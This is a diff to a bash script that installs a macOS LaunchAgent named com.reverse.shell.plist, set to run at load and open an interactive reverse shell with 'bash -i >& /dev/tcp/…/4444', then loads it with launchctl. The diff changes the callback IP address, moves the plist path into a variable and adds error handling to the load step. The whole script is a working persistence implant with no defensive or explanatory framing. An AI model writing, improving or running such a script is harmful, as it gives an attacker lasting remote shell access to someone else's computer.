@@ -1,7 +1,10 @@
 #!/bin/bash
 
+# Define the PLIST file path
+PLIST_PATH=~/Library/LaunchAgents/com.reverse.shell.plist
+
 # Create the LaunchAgent plist
-cat <<'PLIST' > ~/Library/LaunchAgents/com.reverse.shell.plist
+cat <<'PLIST' > "$PLIST_PATH"
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -14,7 +17,7 @@ cat <<'PLIST' > ~/Library/LaunchAgents/com.reverse.shell.plist
   <array>
     <string>/bin/bash</string>
     <string>-c</string>
-    <string>bash -i >& /dev/tcp/10.120.1.201/4444 0>&1</string>
+    <string>bash -i >& /dev/tcp/192.168.64.9/4444 0>&1</string>
   </array>
 
   <key>RunAtLoad</key>
@@ -30,7 +33,11 @@ cat <<'PLIST' > ~/Library/LaunchAgents/com.reverse.shell.plist
 PLIST
 
 # Set permissions
-chmod 644 ~/Library/LaunchAgents/com.reverse.shell.plist
+chmod 644 "$PLIST_PATH"
 
 # Load the agent
-launchctl load ~/Library/LaunchAgents/com.reverse.shell.plist
+if launchctl load "$PLIST_PATH"; then
+  echo "LaunchAgent loaded successfully."
+else
+  echo "Failed to load LaunchAgent. Try running `launchctl bootstrap` as root for richer errors."
+fi
